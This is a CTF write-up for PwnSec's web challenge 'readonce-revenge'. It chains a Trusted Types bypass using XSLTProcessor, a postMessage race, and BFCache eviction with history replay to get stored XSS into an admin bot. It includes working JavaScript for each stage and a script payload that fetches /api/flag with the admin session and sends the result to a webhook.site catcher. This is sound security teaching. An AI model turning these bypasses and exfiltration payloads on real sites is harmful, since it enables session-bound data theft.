---
ctf: PwnSec
title: readonce-revenge
category: web
difficulty: unknown
tags: []
flag_format: pwnsec{}
date: 2026-09-13
---

# readonce-revenge

## Challenge
this is really a revenge

- @Macabely

## Approach
1. The bot authenticates on `APP_URL=http://localhost:3000`, visits
   `/reports/check?rid=...&state=...`, loads `/api/flag`, arms the report, and
   finally visits the reported URL. The public challenge hostname does not
   receive the localhost-scoped admin cookie.
2. From the reported page, open
   `http://localhost:3000/review?rid=<rid>&u=<external-js>`. The review iframe
   runs with Trusted Types and an opaque sandbox origin. The external script
   uses `XSLTProcessor` to construct a nested `srcdoc` iframe containing a
   nonce-bearing copy of itself. This bypasses the Trusted Types string sinks.
3. In the nested frame, queue `top.postMessage(1, "*")` from `onload`. The
   review's outer iframe load handler first sets `closing=true`; the queued
   message then has a source different from `viewer.contentWindow`, causing
   the parent to POST the secret `{id,state}` pair to `/complete`.
4. The original nonce-bearing `/reports/check` URL remains in browser history,
   two entries behind the attacker page. A direct `history.go(-2)` only restores
   it from BFCache and does not contact Express. Create 30 delayed query-string
   navigations first, which evicts that entry from BFCache, then call
   `history.go(-(30+2))`. Chromium reissues the preserved URL with
   `Sec-Fetch-Site: none` and `Sec-Fetch-Dest: document`, satisfying `policy()`
   and `consumeReport()`.
5. The selected note is rendered unescaped by `review-document.ejs`. Its
   128-byte payload fetches `/api/flag` with the localhost admin session and
   navigates to the request catcher with the response.

Nested sandbox script:

```js
if (top == parent) {
  X = "http://www.w3.org/1999/XSL/Transform";
  d = document.implementation.createDocument(X, "xsl:stylesheet");
  d.documentElement.setAttribute("version", "1.0");
  t = d.createElementNS(X, "xsl:template");
  t.setAttribute("match", "/");
  f = d.createElement("iframe");
  f.setAttribute("srcdoc", '<script nonce="' + document.currentScript.nonce +
    '" src="' + document.currentScript.src + '"><\\/script>');
  t.appendChild(f);
  d.documentElement.appendChild(t);
  p = new XSLTProcessor;
  p.importStylesheet(d);
  document.body.appendChild(p.transformToFragment(
    document.implementation.createDocument(null, "x"), document));
} else {
  onload = () => top.postMessage(1, "*");
}
```

Attacker-page logic (`n=30` on the initial report URL):

```js
N = 30;
p = new URLSearchParams(location.search);
n = +p.get("n");
r = p.get("rid");
if (n == N)
  open("http://localhost:3000/review?rid=" + r + "&u=" +
       encodeURIComponent(EXTERNAL_JS));
if (n)
  setTimeout(() => { p.set("n", n - 1); location.search = p }, 20);
else
  setTimeout(() => history.go(-(N + 2)), 500);
```

Note body (exactly 128 bytes for the catcher UUID used during the solve):

```html
<script>fetch('/api/flag').then(r=>r.text()).then(x=>location='//webhook.site/258479f5-4efd-42a8-9ef2-ec19dc0fcee3?'+x)</script>
```

## Tools

- Chromium/CDP for exact BFCache and Fetch Metadata validation
- curl
- Webhook.site for payload hosting and flag capture
- httpbin `/base64/` for a CSP-free attacker page

## Lessons

- Cookies are scoped by host, not port, but the public hostname and localhost
  are different cookie scopes.
- `Vary: Cookie` affects HTTP caching, not BFCache restoration.
- Trusted Types string-sink enforcement can be bypassed when another DOM
  transformation mechanism creates the protected nodes directly.
- Validate browser history and event ordering against the bot's Chromium build.

## Flag

`pwnsec{09a0268f911854ed}`
